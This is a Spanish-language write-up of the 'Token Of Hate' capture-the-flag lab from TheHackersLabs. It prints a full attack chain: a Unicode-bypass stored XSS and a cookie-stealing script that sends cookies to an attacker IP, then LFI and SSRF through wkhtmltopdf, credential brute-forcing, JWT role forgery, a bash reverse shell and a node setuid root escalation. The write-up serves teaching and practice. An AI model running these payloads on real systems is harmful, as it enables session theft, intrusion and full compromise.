---
author: Lenam
pubDatetime: 2025-03-22T00:00:00Z
title: WriteUp Token Of Hate - TheHackersLabs
slug: token-of-hate-writeup-thehackerslabs-es
featured: true
draft: false
ogImage: "assets/token-of-hate/OpenGraph.png"
tags:
  - writeup
  - thehackerslabs
  - jwt
  - xss
  - ssrf
  - lfi
  - rce
  - capabilities
  - cookie hijacking
description:
  Resolución de un CTF de TheHackersLabs, con enumeración, explotación de XSS almacenado mediante Unicode, secuestro de cookies, ataques LFI y SSRF, manipulación de JWT para RCE y escalada de privilegios por medio de capabilities en Linux.
lang: es
---
![Rabbit Token Of Hate](/assets/token-of-hate/OpenGraph.png)

Resolución de un CTF de TheHackersLabs, con enumeración, explotación de XSS almacenado mediante Unicode, secuestro de cookies, ataques LFI y SSRF, manipulación de JWT para RCE y escalada de privilegios por medio de capabilities en Linux.

## Tabla de contenido

## Enumeración

![alt text](/assets/token-of-hate/image.png)

Hacemos ping y observamos, por el TTL 64, que se trata de una máquina con sistema operativo `Linux`.

```bash
$ ping -c 1 192.168.1.117
PING 192.168.1.117 (192.168.1.117) 56(84) bytes of data.
64 bytes from 192.168.1.117: icmp_seq=1 ttl=64 time=0.195 ms

--- 192.168.1.117 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.195/0.195/0.195/0.000 ms
```

Comenzamos con un escaneo rápido de todos los puertos de la máquina.

```bash
$ nmap -p- -Pn -n 192.168.1.117
Starting Nmap 7.93 ( https://nmap.org ) at 2025-03-21 21:22 CET
Nmap scan report for 192.168.1.117
Host is up (0.00012s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
```

Encontramos dos puertos abiertos, el 22 `ssh` y el 80 `http`. A continuación, realizamos un análisis más exhaustivo para obtener más información sobre los servicios en los puertos 80 y 22.

```bash
$ nmap -p22,80 -sVC -T4 -Pn -n 192.168.1.117
Starting Nmap 7.93 ( https://nmap.org ) at 2025-03-21 21:23 CET
Nmap scan report for 192.168.1.117
Host is up (0.00017s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 fd6a7017f74007feeb5a5d365632f039 (ECDSA)
|_  256 2d3d4ba1f6e38d91094ca8b3857db5c1 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Home
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.65 seconds
```

No descubrimos más información con el escaneo exhaustivo de nmap. Ejecutamos `whatweb` por si logramos obtener más detalles sobre el sitio web:

```bash
$ whatweb -v 192.168.1.117
WhatWeb report for http://192.168.1.117
Status    : 200 OK
Title     : Home
IP        : 192.168.1.117
Country   : RESERVED, ZZ

Summary   : Apache[2.4.62], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.62 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : Debian Linux
        String       : Apache/2.4.62 (Debian) (from server string)

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Fri, 21 Mar 2025 20:44:12 GMT
        Server: Apache/2.4.62 (Debian)
        Vary: Accept-Encoding
        Content-Encoding: gzip
        Content-Length: 1504
        Connection: close
        Content-Type: text/html; charset=UTF-8

```

Además, hacemos un escaneo de tipo `fuzzing` de distintos endpoints o archivos en el servicio web mediante `gobuster`, usando el diccionario `directory-list-2.3-medium.txt` de `seclist`.

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.117 -x .php,.txt,.zip,.db,.htm,.html,.phar,.db,.asp,.aspx
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.117
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              asp,php,txt,htm,phar,aspx,zip,db,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.htm                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 2952]
/login.php            (Status: 200) [Size: 1054]
/.html                (Status: 403) [Size: 278]
/.phar                (Status: 403) [Size: 278]
/javascript           (Status: 301) [Size: 319] [--> http://192.168.1.117/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/registro.php         (Status: 200) [Size: 1089]
/.html                (Status: 403) [Size: 278]
/.phar                (Status: 403) [Size: 278]
/.htm                 (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 2205590 / 2205600 (100.00%)
===============================================================
Finished
===============================================================

```

### Enumeración manual

Abrimos el sitio web que se ejecuta en el puerto 80 desde el navegador.

![alt text](/assets/token-of-hate/image-1.png)

Nos encontramos con un sitio web que, si lo observamos detenidamente, nos aporta varias pistas sobre cómo puede producirse la intrusión:

- Explica que la aplicación, para uso interno, transforma los nombres de usuario a sus caracteres ASCII equivalentes.
- También indica que el usuario administrador siempre revisará los nuevos registros.

Además, vemos dos enlaces: uno a un formulario de registro, `Ir a Registro`.

![alt text](/assets/token-of-hate/image-2.png)

Con el siguiente código fuente:

**registro.php**

```html
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Registro</title>
  <link rel="stylesheet" href="hoja.css">

  <script>
    // Validación en el cliente: se rechazan los caracteres prohibidos (<, >, ", ', &)
    function validarUsername() {
      /*
      var username = document.getElementById("username").value;
      var regex = /[<>"'&]/;
      if (regex.test(username)) {
        alert("El nombre de usuario contiene caracteres HTML prohibidos.");
        return false;
      }
        */
      return true;
    }
  </script>
</head>
<body>
  <h1 class="blink">Registro</h1>
  <form action="procesarRegistro.php" method="post" onsubmit="return validarUsername();">
    <label for="username">Nombre de usuario:</label>
    <input type="text" name="username" id="username" required>
    <br>
    <label for="password">Contraseña:</label>
    <input type="password" name="password" id="password" required>
    <br>
    <input type="submit" value="Registrarse">
  </form>
  <p><a href="login.php">Ir a Login</a></p>
  <p><a href="/">Home</a></p>
</body>
</html>
```

El otro enlace muestra el formulario de inicio de sesión, `Ir a Login`.

![alt text](/assets/token-of-hate/image-3.png)

Con el siguiente código fuente:

**login.php**

```html
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <script>
    // Validación en el cliente para evitar caracteres HTML prohibidos
    function validarUsername() {
      var username = document.getElementById("username").value;
      var regex = /[<>"'&]/;
      if (regex.test(username)) {
        alert("El nombre de usuario contiene caracteres HTML prohibidos.");
        return false;
      }
      return true;
    }
  </script>
  <link rel="stylesheet" href="hoja.css">

</head>
<body>
  <h1 class="blink">Login</h1>
  <form action="procesarLogin.php" method="post" onsubmit="return validarUsername();">
    <label for="username">Nombre de usuario:</label>
    <input type="text" name="username" id="username" required>
    <br>
    <label for="password">Contraseña:</label>
    <input type="password" name="password" id="password" required>
    <br>
    <input type="submit" value="Iniciar Sesión">
  </form>
  <p><a href="registro.php">Ir a Registro</a></p>
  <p><a href="/">Home</a></p>
</body>
</html>
```

Nos registramos con cualquier usuario y contraseña. Luego iniciamos sesión con esos mismos datos, encontrándonos con una página privada:

![alt text](/assets/token-of-hate/image-4.png)

Si revisamos el código fuente de esta página, hay algunas pistas adicionales en los comentarios.

**pagina_privada.php**

```html
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <title>Página Privada</title>
    <link rel="stylesheet" href="hoja.css">
</head>

<body>
    <h1>Página Privada</h1>
    <p>Bienvenido, lenam!</p>

    <!-- Sección visible para todos los usuarios validados -->
    <section id="seccion_users">
        <h2>Contenido para Usuarios</h2>
        <p>Este contenido es visible para todos los usuarios autenticados (roles "user" y "admin").</p>
    </section>

    <!-- Sección exclusiva para usuarios con rol "admin" -->
  

    <p><a href="logout.php">Cerrar sesión</a></p>
</body>

</html>
```

Observamos que la cookie del navegador, creada en nuestra sesión, no tiene activadas las flags `HttpOnly`, `Secure` ni `SameSite`.

![alt text](/assets/token-of-hate/image-5.png)

## Intrusión

### Pistas para la intrusión

- En el texto de la página principal `index.php` se comenta que el usuario administrador revisa los nuevos registros.
- También se explica que pueden utilizarse caracteres `Unicode` en los nombres de usuario y que, internamente, se convierten a ASCII.
- En las cabeceras de `whatweb` podemos ver que no se usa ninguna cabecera `CSP` de protección contra XSS, ni se tienen configuradas cabeceras de `CORS`.
- La cookie de sesión generada por la aplicación no cuenta con ningún tipo de protección para su lectura o envío.
- En el código fuente de `login.php` observamos que los caracteres `<>"'&` no están permitidos para el nombre de usuario.

### XSS almacenado

Primero, debemos crear un usuario que nos permita inyectar un script en la página (Stored XSS). Para conseguirlo, nos aprovechamos de caracteres `Unicode`. Si usamos alguno de los caracteres prohibidos `<>"'&` de forma directa, no podremos, pero podemos reemplazarlos por equivalentes que solo existan en `Unicode`, los cuales se transformarán a ASCII internamente, logrando el objetivo.

| ASCII | Unicode |
| :---: | ------- |
|   <   | ＜      |
|   >   | ＞      |
|   "   | “      |
|   '   | ’      |
|   &   | ＆      |

Preparamos un pequeño script en bash para facilitar esta tarea.

```bash
#!/usr/bin/env bash
#
# Uso:
#   ./transformar.sh "Texto con & < > ' y \""
#
# El script imprimirá el texto transformado por stdout con posibles equivalentes ASCII en unicode

INPUT="$1"

#    - &   => ＆ (U+FF06, Fullwidth Ampersand)
#    - <   => ＜ (U+FF1C, Fullwidth Less-Than Sign)
#    - >   => ＞ (U+FF1E, Fullwidth Greater-Than Sign)
#    - '   => ’ (U+2019, Right Single Quotation Mark)
#    - "   => “ (U+201C, Left Double Quotation Mark)
OUTPUT="$(echo "$INPUT" | sed -E \
  -e 's/&/＆/g' \
  -e 's/</＜/g' \
  -e 's/>/＞/g' \
  -e "s/'/’/g" \
  -e 's/\"/“/g'
)"

echo "$OUTPUT"
```

También podría hacerse de manera manual. En nuestro caso, ejecutamos el siguiente comando y copiamos el resultado para usarlo como nombre de usuario al registrarnos:

```bash
./transformar.sh '<script src="http://[IP-atacante]/script.js"></script>'
```

En mi caso:

```bash
$ ./tranformar.sh '<script src="http://192.168.1.181/script.js"></script>'
＜script src=“http://192.168.1.181/script.js“＞＜/script＞
```

![alt text](/assets/token-of-hate/image-6.png)

Por otro lado, creamos un servicio web con Python en el puerto 80 y nos ponemos a la escucha. En poco tiempo recibimos la solicitud:

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.117 - - [21/Mar/2025 23:41:21] code 404, message File not found
192.168.1.117 - - [21/Mar/2025 23:41:21] "GET /script.js HTTP/1.1" 404 -
```

### Secuestro de cookies

Puesto que el XSS almacenado realiza peticiones a nuestro servicio HTTP en busca del archivo `script.js`, solo debemos modificar ese archivo para ejecutar JavaScript en el navegador de la víctima.

Ejecutamos lo siguiente para crear el fichero `script.js` en la misma carpeta que comparte nuestro servicio web:

```bash
$ echo 'x=new XMLHttpRequest;x.open("GET","http://[IP-atacante]?cookie="+btoa(document.cookie));x.send();' > script.js
```

En mi caso:

```bash
$ echo 'x=new XMLHttpRequest;x.open("GET","http://192.168.1.181?cookie="+btoa(document.cookie));x.send();' > script.js
```

Y recibimos la cookie del usuario, en formato base64, en nuestro servicio web:

```bash
192.168.1.117 - - [21/Mar/2025 23:46:44] "GET /script.js HTTP/1.1" 304 -
192.168.1.117 - - [21/Mar/2025 23:46:44] "GET /?cookie=UEhQU0VTU0lEPXNkM3EzZWVnMHY3Y2wzcGhpbTVyMjFpcWFo HTTP/1.1" 200 -
```

Descodificamos el base64 de la cookie y vemos que es la misma que se creó al iniciar sesión con nuestro usuario, pero con un valor diferente.

```bash
$ echo UEhQU0VTU0lEPXNkM3EzZWVnMHY3Y2wzcGhpbTVyMjFpcWFo | base64 -d
PHPSESSID=sd3q3eeg0v7cl3phim5r21iqah  
```

Iniciamos sesión en el navegador con el primer usuario de prueba que creamos (si fuera necesario, creamos otro desde el formulario de registro). Una vez logueados, desde las herramientas de desarrollador del navegador, en la pestaña `Storage > Cookies`, sustituimos el valor de la cookie de sesión `PHPSESSID` por el que nos llegó a través de nuestro servicio web y después actualizamos la página.

![alt text](/assets/token-of-hate/image-7.png)

Obtenemos acceso como usuario con rol de administrador en la aplicación web. A partir de ahí podemos ver todos los usuarios registrados, eliminarlos y descargar un documento PDF con su listado.

![alt text](/assets/token-of-hate/image-8.png)

### Inclusión de fichero local (LFI)

Al generar el documento PDF, observamos que se envían peticiones a nuestro servicio web, pero sin ningún dato para la cookie:

```
192.168.1.117 - - [22/Mar/2025 00:00:31] "GET /?cookie= HTTP/1.1" 200 -
```

Descargamos el PDF con la lista de usuarios y lo analizamos.

![alt text](/assets/token-of-hate/image-9.png)

Con `exiftool` vemos que está generado con `wkhtmltopdf 0.12.6`, una herramienta muy usada para convertir `HTML` a `PDF`.

Editamos el archivo `script.js` de nuestro servidor web en Python para intentar leer datos del propio servidor.

```javascript
x=new XMLHttpRequest;
x.onload=function(){
  document.write("<pre>"+this.responseText+"</pre>");
};
x.open("GET","file:///etc/passwd");
x.send();
```

Descargamos el PDF y obtenemos el contenido de `/etc/passwd`.

![alt text](/assets/token-of-hate/image-10.png)

Podemos seguir extrayendo diferentes archivos del servidor, pero encontramos credenciales filtradas en el archivo `/var/www/html/index.php`.

![alt text](/assets/token-of-hate/image-11.png)

Las anotamos para tenerlas presentes:

```text
['admin', 'dUnAyw92B7qD4OVIqWXd', 'admin'],
['Łukasz', 'dQnwTCpdCUGGqBQXedLd', 'user'],
['Þór', 'EYNlxMUjTbEDbNWSvwvQ', 'user'],
['Ægir', 'DXwgeMuQBAtCWPPQpJtv', 'user'],
['Çetin', 'FuLqqEAErWQsmTQQQhsb', 'user'],
['José', 'FuLqqEAErWQsmTQQQhsb', 'user'],
```

### Solicitudes a recursos internos (SSRF)

Utilizamos el mismo XSS almacenado para descubrir recursos internos del servidor. Volvemos a modificar el archivo `script.js` para realizar un escaneo interno de los puertos más comunes para `http`. Cambia la IP `192.168.1.181` por la de tu servidor web:

```javascript
const ports=[66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6346,6347,7001,7002,8000,8080,8443,8888,30821];
function handleLoad(x,p) {
  let y=new XMLHttpRequest();
  y.open("GET",`http://192.168.1.181/ping?port=${p}`);
  y.send();
}
ports.forEach( (p,i) =>
  setTimeout( () => {
    let x=new XMLHttpRequest();
    x.open("GET",`http://localhost:${p}`);
    x.timeout=300;
    x.onload=()=>handleLoad(x,p);x.send();
  }, i*10)
);
```

Observamos que además del puerto `80`, el puerto `3000` también está abierto en la red interna.

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.117 - - [22/Mar/2025 00:24:05] "GET /script.js HTTP/1.1" 304 -
192.168.1.117 - - [22/Mar/2025 00:24:05] code 404, message File not found
192.168.1.117 - - [22/Mar/2025 00:24:05] "GET /ping?port=80 HTTP/1.1" 404 - <---
192.168.1.117 - - [22/Mar/2025 00:24:06] code 404, message File not found
192.168.1.117 - - [22/Mar/2025 00:24:06] "GET /ping?port=3000 HTTP/1.1" 404 - <---
```

Volvemos a modificar `script.js` para visualizar la respuesta del puerto 3000.

```javascript
x=new XMLHttpRequest;
x.onload=function(){
  document.write("<div>"+this.responseText+"</div>")
};
x.open("GET","http://localhost:3000");
x.send();
```

Descargamos el PDF y vemos un texto en formato JSON:

![alt text](/assets/token-of-hate/image-12.png)

```json
{
   "name":"API de Comandos",
   "version":"1.2.0",
   "description":"API para autenticación y ejecución de comandos utilizando
un token.",
   "endpoints":{
      "/":{
         "method":"GET",
         "description":"Muestra la información de la API y la descripción de los
endpoints disponibles."
      },
      "/login":{
         "method":"POST",
         "description":"Permite iniciar sesión. Se espera un body en formato
JSON con 'username' y 'password'. Si el login es correcto, se retorna un token JWT. Ejemplo: { \"username\": \"test\",
\"password\": \"123456\" }"
      },
      "/command":{
         "method":"POST",
         "description":"Ejecuta un comando del sistema para
usuarios autenticados con rol admin. Se espera un body en formato JSON con 'command' y 'token' o enviando el token
en la cabecera 'Authorization'. Ejemplo: { \"command\": \"ls -la\", \"token\": \"token_jwt\" }"
      }
   }
}
```

Parece ser la documentación de una API interna que permite la ejecución de comandos. Modificamos nuevamente nuestro archivo `script.js` para intentar validar las credenciales de los usuarios filtrados en `/var/www/html/index.php`.

Además, como internamente se emplea la versión ASCII de los nombres de usuario, añadimos sus nombres transformados a ASCII y también una versión en minúsculas:

```javascript
const users = [
    { nombre: "admin", pas: "dUnAyw92B7qD4OVIqWXd" },
    { nombre: "Łukasz", pas: "dQnwTCpdCUGGqBQXedLd" },
    { nombre: "Þór", pas: "EYNlxMUjTbEDbNWSvwvQ" },
    { nombre: "Ægir", ipasd: "DXwgeMuQBAtCWPPQpJtv" },
    { nombre: "Çetin", pas: "FuLqqEAErWQsmTQQQhsb" },
    { nombre: "José", pas: "FuLqqEAErWQsmTQQQhsb" },
    // Versión en ASCII de los nombres de usuarios.
    { nombre: "admin", pas: "dUnAyw92B7qD4OVIqWXd" },
    { nombre: "Lukasz", pas: "dQnwTCpdCUGGqBQXedLd" },
    { nombre: "Thor", pas: "EYNlxMUjTbEDbNWSvwvQ" },
    { nombre: "AEgir", pas: "DXwgeMuQBAtCWPPQpJtv" },
    { nombre: "Cetin", pas: "FuLqqEAErWQsmTQQQhsb" },
    { nombre: "Jose", pas: "FuLqqEAErWQsmTQQQhsb" },
    // Versión en ASCII de los nombres de usuarios y en minúsculas.
    { nombre: "admin", pas: "dUnAyw92B7qD4OVIqWXd" },
    { nombre: "lukasz", pas: "dQnwTCpdCUGGqBQXedLd" },
    { nombre: "thor", pas: "EYNlxMUjTbEDbNWSvwvQ" },
    { nombre: "aegir", pas: "DXwgeMuQBAtCWPPQpJtv" },
    { nombre: "cetin", pas: "FuLqqEAErWQsmTQQQhsb" },
    { nombre: "jose", pas: "FuLqqEAErWQsmTQQQhsb" }
];

function testUser(user) {
    let xhr = new XMLHttpRequest();
    xhr.open("POST", "http://localhost:3000/login", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = () => {
        if (xhr.status >= 200)
            new Image().src = `http://192.168.1.181/?user=${user.username}&response=${btoa(xhr.responseText)}`
    }
    xhr.send(JSON.stringify(user));
}

users.forEach(async user => {
    // Envía la petición con el body en JSON
    testUser({
        username: user.nombre,
        password: user.pas
    });
});
```

Esperamos un momento y, al poco tiempo, recibimos todas las peticiones en nuestro servicio web. Fijándonos, los datos más extensos corresponden al usuario `Jose` (con la primera letra mayúscula y sin acento).

![alt text](/assets/token-of-hate/image-13.png)

Descodificamos la respuesta en base64 de la petición de inicio de sesión para el usuario `Jose`:

```bash
$ echo eyJtZXNzYWdlIjoiTG9naW4gY29ycmVjdG8iLCJ0b2tlbiI6ImV5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUoxYzJWeWJtRnRaU0k2SWtwdmMyVWlMQ0p5YjJ4bElqb2lkWE5sY2lJc0ltbGhkQ0k2TVRjME1qWXdNalF3TWl3aVpYaHdJam94TnpReU5qQTJNREF5ZlEuWFEwT1QzWng4VmYtZGlpNmxQX0hFNER6emYtOVQxWUhuVlk3VXhPTWU2cyJ9|base64 -d
{"message":"Login correcto","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ikpvc2UiLCJyb2xlIjoidXNlciIsImlhdCI6MTc0MjYwMjQwMiwiZXhwIjoxNzQyNjA2MDAyfQ.XQ0OT3Zx8Vf-dii6lP_HE4Dzzf-9T1YHnVY7UxOMe6s"}
```

Obtenemos un JSON con un mensaje y un token, tal como especificaba el endpoint principal de la API, con pinta de ser un token JWT.

### Ejecución remota (RCE)

Descodificamos el token JWT para conocer su validez temporal, el tipo de cifrado y los datos de su payload.

**Token JWT obtenido**

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ikpvc2UiLCJyb2xlIjoidXNlciIsImlhdCI6MTc0MjYwMjQwMiwiZXhwIjoxNzQyNjA2MDAyfQ.XQ0OT3Zx8Vf-dii6lP_HE4Dzzf-9T1YHnVY7UxOMe6s
```

Usamos http://jwt.io para decodificarlo.

![alt text](/assets/token-of-hate/image-14.png)

Observamos que el token usa el algoritmo `HS256` (parámetro `alg` del HEADER) y que su validez tras iniciar sesión es de 1 hora. Esto se ve en los campos `exp` (momento de expiración en UNIX timestamp) y `iat` (momento de emisión, también en UNIX timestamp) del payload.

```
1742606002 - 1742602402 = 3600 segundos = 1 hora
```

Es decir, si transcurre más de una hora hasta que lo usemos, tendremos que solicitar uno nuevo validando de nuevo al usuario. Además, vemos en el payload que pertenece al usuario `Jose` con rol `user`.

Nos interesa ejecutar el comando del endpoint `/command` de la API interna. Si recordamos lo obtenido anteriormente, solo sirve para el rol `admin`, y el token que tenemos pertenece al rol `user`.

```json
      "/command":{
         "method":"POST",
         "description":"Ejecuta un comando del sistema para
usuarios autenticados con rol admin. Se espera un body en formato JSON con 'command' y 'token' o enviando el token
en la cabecera 'Authorization'. Ejemplo: { \"command\": \"ls -la\", \"token\": \"token_jwt\" }"
      }
```

Podemos manipular el token JWT para modificar el campo `role` en su payload. Si la aplicación no valida bien la firma del token, podremos suplantar a un usuario con el rol `admin`.

Podemos hacerlo de forma manual o usando el siguiente script, que lo automatiza. Volvemos a editar nuestro fichero `script.js`:

```javascript
var command = "id";

// Petición para realizar el login y obtener el token actualizado.
petition1 = new XMLHttpRequest();
petition1.open('POST', 'http://localhost:3000/login', true);
petition1.setRequestHeader('Content-Type', 'application/json');

// Petición para ejecutar el comando.
petition2 = new XMLHttpRequest();
petition2.open('POST', 'http://localhost:3000/command', true);
petition2.setRequestHeader('Content-Type', 'application/json');

function base64urlDecode(str) {
    // Reemplaza caracteres específicos de Base64URL
    str = str.replace(/-/g, '+').replace(/_/g, '/');
    // Añadir padding si es necesario
    while (str.length % 4) {
        str += '=';
    }
    return atob(str);
}

function base64urlEncode(str) {
    return btoa(str)
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');
}

petition2.onload = () => {
    document.write("Resultado");
    document.write(petition2.responseText);
}

petition1.onload = () => {
    // Obtenemos el token JWT y lo separamos en sus partes.
    let tokenParts = JSON.parse(petition1.responseText).token.split(".");

    // Decodificamos la parte del payload y la convertimos en objeto.
    let payloadDecoded = JSON.parse(base64urlDecode(tokenParts[1]));

    // Modificamos el role del usuario.
    payloadDecoded.role = "admin";

    // Codificamos otra vez el payload modificado.
    tokenParts[1] = base64urlEncode(JSON.stringify(payloadDecoded));

    // Reconstruimos el token modificado.
    let tokenModificado = tokenParts.join(".");

    sendSecondPetition(tokenModificado);
}

function sendSecondPetition(tokenModificado) {
    petition2.send(`{"token":"${tokenModificado}","command":"${command}"}`);
}

petition1.send('{"username":"Jose","password":"FuLqqEAErWQsmTQQQhsb"}');
```

Descargamos otro PDF y obtenemos la ejecución de comandos con el usuario `ctesias`.

![alt text](/assets/token-of-hate/image-15.png)

Modificamos la variable `command` de nuestro JavaScript en el archivo `script.js`, introduciendo la IP de nuestra máquina atacante:

```javascript
var command = "bash -c 'bash -i >& /dev/tcp/192.168.1.181/12345 0>&1'";
```

Nos ponemos a la escucha con netcat en el puerto `12345` y creamos otro PDF:

```bash
$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.1.181] from (UNKNOWN) [192.168.1.117] 40170
bash: no se puede establecer el grupo de proceso de terminal (497): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
ctesias@tokenofhate:/$ 
```

Entramos en la máquina víctima como el usuario `ctesias`.

![alt text](/assets/token-of-hate/image-16.png)

Podemos leer la flag de `user.txt`:

```bash
tesias@tokenofhate:~$ cat user.txt
cat user.txt
98XXXXXXXXXXXXXXXXXXXXXXXXXXXXa3
```

## Escalada de privilegios

Tratamos la terminal o introducimos nuestra clave pública SSH para trabajar más cómodamente en el servidor.

Buscamos ficheros con capabilities:

```bash
$ getcap -r /
getcap -r /
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/yournode cap_setuid=ep
```

Encontramos un binario sospechoso, `/usr/bin/yournode`, y confirmamos que es una copia de `nodejs`:

```bash
$ /usr/bin/yournode
Welcome to Node.js v18.19.0.
Type ".help" for more information.
> .exit
$ /usr/bin/yournode --version
v18.19.0
```

Buscamos en `gtfobins` una forma de escalar con un binario `node` que tenga capabilities y la encontramos.

![alt text](/assets/token-of-hate/image-17.png)

Ejecutamos el siguiente comando para conseguir privilegios de root:

```bash
ctesias@tokenofhate:~$ /usr/bin/yournode -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
# id
uid=0(root) gid=1000(ctesias) grupos=1000(ctesias),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
# 
```

Leemos la flag de `root.txt`:

```bash
# cat /root/root.txt
b6XXXXXXXXXXXXXXXXXXXXXX2d
```

¡Felicidades! Si has llegado hasta aquí, has obtenido las flags, aunque quizá todavía falte algo por descubrir.

¿Te fijaste en la imagen del conejo `hate` al principio? También forma parte de este CTF. Si no la encontraste, es que no buscaste en todos los lugares 😉.
